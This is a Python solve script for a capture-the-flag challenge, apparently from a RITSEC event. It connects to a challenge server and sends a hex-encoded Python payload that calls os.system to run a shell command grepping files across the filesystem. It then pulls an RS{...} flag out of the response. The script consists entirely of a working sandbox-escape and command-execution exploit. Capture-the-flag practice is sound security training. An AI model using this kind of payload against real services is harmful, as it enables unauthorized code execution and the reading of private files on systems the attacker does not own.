#!/usr/bin/env python3
import re
import socket

HOST = "impossibler-pygolf.ctf.ritsec.club"
PORT = 1234

code = 'import os;os.system(\'echo "`grep -z Tw /*/*/*16`"\')'
payload = code.encode().hex()
assert len(payload) <= 103, len(payload)

def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

with socket.create_connection((HOST, PORT), timeout=30) as s:
    s.settimeout(30)
    recv_until(s, b"hex > ")
    s.sendall(payload.encode() + b"\n")

    out = b""
    while True:
        try:
            chunk = s.recv(4096)
        except TimeoutError:
            break
        if not chunk:
            break
        out += chunk

text = out.decode("utf-8", errors="replace")
print(text)

m = re.search(r"RS\{[^\n}]+\}", text)
if m:
    print(m.group(0))
else:
    print("flag not found")
